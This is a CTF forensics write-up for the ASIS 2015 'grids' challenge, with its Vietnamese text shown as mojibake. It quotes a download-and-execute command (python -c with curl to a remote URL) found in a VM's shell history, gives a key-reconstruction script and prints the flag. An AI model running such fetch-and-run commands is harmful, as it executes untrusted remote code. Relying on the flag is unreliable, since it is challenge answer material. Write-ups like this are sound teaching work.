<p>MÃ¬nh Ä‘Ã£ táº¡o má»™t mÃ¡y áº£o VirtualBox vá»›i há»‡ Ä‘iá»u hÃ nh lÃ  Ubuntu x64, Ä‘á»ƒ á»• cá»©ng káº¿t ná»‘i á»Ÿ IDE Primary Master, card máº¡ng lÃ  Am79C973, RAM lÃ  128MB. Sau Ä‘Ã³ mÃ¬nh boot mÃ¡y áº£o nÃ y, suspend nÃ³, rá»“i ghi Ä‘Ã¨ file Ä‘Ã£ cho vÃ o file .sav Ä‘Æ°á»£c VirtualBox táº¡o ra. Sau Ä‘Ã³ khi khá»Ÿi Ä‘á»™ng láº¡i, mÃ¬nh vÃ o Ä‘Æ°á»£c tráº¡ng thÃ¡i Ä‘ang lÆ°u trong file .sav vá»›i há»‡ Ä‘iá»u hÃ nh lÃ  Tiny Core Linux:</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?ssl=1"><img data-attachment-id="345" data-permalink="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/asis_dump/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=1024%2C768&amp;ssl=1" data-orig-size="1024,768" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="asis_dump" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=604%2C453&amp;ssl=1" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?resize=300%2C225&#038;ssl=1" alt="asis_dump" width="300" height="225" class="alignnone size-medium wp-image-345" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?w=1024&amp;ssl=1 1024w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
<p>á» trong lá»‹ch sá»­ dÃ²ng lá»‡nh, cÃ³ má»™t lá»‡nh lÃ  </p>
<pre>python -c "$(curl -fSsL http://a.asis.io/0QnqZU9F)"</pre>
<p>Lá»‡nh nÃ y down 1 file .py tá»« server vÃ  thá»±c hiá»‡n file nÃ y. MÃ¬nh Ä‘Ã£ khÃ´ng quan tÃ¢m Ä‘áº¿n nÃ³ trong khi Ä‘Ã¢y chÃ­nh lÃ  máº¥u chá»‘t cá»§a bÃ i toÃ¡n :&lt; (cáº£m Æ¡n anh @yeuchimse Ä‘Ã£ chá»‰ cho em Ä‘oáº¡n nÃ y :3).</p>
<p>NhÆ° váº­y cÃ³ kháº£ nÄƒng file Python kia váº«n cÃ²n Ä‘Æ°á»£c lÆ°u Ä‘Ã¢u Ä‘Ã³ á»Ÿ trong RAM cá»§a mÃ¡y áº£o, vÃ¬ váº­y cáº§n pháº£i Ä‘á»c Ä‘Æ°á»£c RAM vÃ  tÃ¬m kiáº¿m Ä‘oáº¡n &#039;Please enter the access key&#039; vÃ¬ khi chÆ°Æ¡ng trÃ¬nh Ä‘Æ°á»£c cháº¡y cÃ³ in ra dÃ²ng nÃ y. Trong quÃ¡ trÃ¬nh thi, mÃ¬nh Ä‘Ã£ cháº¡y VirtualBox trong má»™t mÃ¡y áº£o VMware vÃ  dump RAM cá»§a mÃ¡y áº£o VMware Ä‘á»ƒ tÃ¬m trong Ä‘Ã³ :&lt;. Tuy váº­y cÃ³ má»™t cÃ¡ch Ä‘Æ¡n giáº£n hÆ¡n lÃ  dÃ¹ng HxD hoáº·c Cheat Engine. Sau khi tÃ¬m kiáº¿m vá»›i chuá»—i: </p>
<pre>'Please enter the access key</pre>
<p>, ta tÃ¬m Ä‘Æ°á»£c Ä‘oáº¡n code:</p>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?ssl=1"><img data-attachment-id="346" data-permalink="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/memview/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=732%2C626&amp;ssl=1" data-orig-size="732,626" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="memview" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=300%2C257&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=604%2C517&amp;ssl=1" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?resize=300%2C257&#038;ssl=1" alt="memview" width="300" height="257" class="alignnone size-medium wp-image-346" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?resize=300%2C257&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?w=732&amp;ssl=1 732w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
<p>Äoáº¡n code nÃ y yÃªu cáº§u nháº­p 1 chuá»—i lÃ  key, vÃ  náº¿u key Ä‘Ãºng sáº½ in ra thá»© gÃ¬ Ä‘Ã³. Thá»­ xÃ¢y dá»±ng láº¡i key tá»« file code tÃ¬m Ä‘Æ°á»£c, sau Ä‘Ã³ dÃ¹ng key nÃ y Ä‘á»ƒ tÃ¬m chuá»—i in ra:</p>
<pre class="font:consolas lang:python decode:true">import hashlib
 
# calculate key
key_ar = [0 for i in range(5)]
key_ar[0] = hex(58559604012647)[2:].decode('hex')
key_ar[1] = hex(27697077611219024)[2:].decode('hex')
key_ar[2] = hex(28839576914310229)[2:].decode('hex')
key_ar[3] = hex(14469853439423811)[2:].decode('hex')
key_ar[4] = hex(21189029315236706)[2:].decode('hex')
key = '-'.join(key_ar)
 
# original code
# key = raw_input('Please enter the access key: ').strip()
if len(key) == 38:
    key_ar = key.split('-')
    if len(key_ar) == 5:
        if int(key_ar[0].encode('hex'), 16) ==  58559604012647:
            if int(key_ar[1].encode('hex'), 16) == 27697077611219024:
                if int(key_ar[2].encode('hex'), 16) == 28839576914310229:
                    if int(key_ar[3].encode('hex'), 16) == 14469853439423811:
                        if int(key_ar[4].encode('hex'), 16) == 21189029315236706:
                            print key[18] + key[-2] + chr(ord(key[26]) - 1) + key[-2] + '{' + hashlib.md5(key).hexdigest() + '}'
                        else:
                             print 'You access key is not correct! Banned!!'
                    else:
                        print 'You access key is not correct! Banned!!'
                else:
                    print 'You access key is not correct! Banned!!'
            else:
                print 'You access key is not correct! Banned!!'
        else:
            print 'You access key is not correct! Banned!!'
    else:
        print 'You access key is not correct! Banned!!'
else:
    print 'You access key is not correct! Banned!!'</pre>
<p>Sau khi cháº¡y file trÃªn, ta Ä‘Æ°á»£c flag: </p>
<pre>ASIS{632253c69a6049594bc303f0af0042b8}</pre>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">334</post-id>	</item>
	</channel>
</rss>
